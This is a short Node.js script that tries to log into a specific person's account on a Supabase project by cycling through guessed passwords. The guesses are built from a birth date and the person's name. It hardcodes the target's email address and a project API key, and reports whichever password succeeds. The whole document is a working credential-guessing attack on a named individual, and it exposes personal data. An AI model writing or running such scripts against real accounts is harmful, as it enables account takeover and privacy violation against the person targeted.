const { createClient } = require('@supabase/supabase-js');
const supabaseUrl = 'https://ktontqbfcinzqvalxyqd.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt0b250cWJmY2luenF2YWx4eXFkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2NTE0MzUsImV4cCI6MjA5MzIyNzQzNX0.XZPB5rzKKyHQW6HrKsiwFJoPJnQDEhqOT5jzYKEhQp8';
const supabase = createClient(supabaseUrl, supabaseKey);

async function tryLogin(password) {
  const { data, error } = await supabase.auth.signInWithPassword({
    email: 'bhanuprasad092627@gmail.com',
    password: password
  });
  if (error) {
    console.log(`Failed for password "${password}": ${error.message}`);
    return false;
  } else {
    console.log(`Success! Password is: ${password}`);
    return true;
  }
}

async function run() {
  const dobCandidates = [
    '2005-05-15',
    '15052005',
    '15-05-2005',
    '05152005',
    '05-15-2005',
    'Bhanu@123',
    'FeedX@123',
    'BhanuPrasad@123',
    'BhanuPrasad'
  ];
  for (const pwd of dobCandidates) {
    if (await tryLogin(pwd)) break;
  }
}
run();
